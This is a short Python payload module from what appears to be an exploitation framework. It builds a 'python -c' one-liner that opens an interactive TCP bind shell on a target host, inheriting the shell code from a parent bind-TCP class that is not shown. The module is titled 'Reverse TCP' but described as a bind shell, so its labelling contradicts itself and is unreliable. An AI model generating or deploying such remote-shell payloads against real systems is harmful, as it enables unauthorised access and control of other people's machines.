from thg.core.exploit import *
from thg.modules.payloads.python.bind_tcp import Payload as PythonBindTCP


class Payload(PythonBindTCP):
    __info__ = {
        "name": "Python Reverse TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thg module
        ),
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload
